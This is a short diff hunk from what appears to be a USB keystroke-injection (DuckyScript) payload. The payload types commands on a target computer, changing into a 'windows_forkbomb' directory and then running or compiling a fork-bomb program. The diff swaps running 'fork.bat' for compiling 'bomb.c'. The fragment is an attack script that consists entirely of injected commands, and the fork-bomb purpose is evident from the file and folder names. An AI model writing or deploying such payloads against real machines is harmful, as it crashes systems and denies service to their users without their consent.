@@ -26,5 +26,5 @@ DELAY 4000
 STRING cd windows_forkbomb
 ENTER
 DELAY 3000
-STRING ./fork.bat
+STRING gcc bomb.c
 ENTER
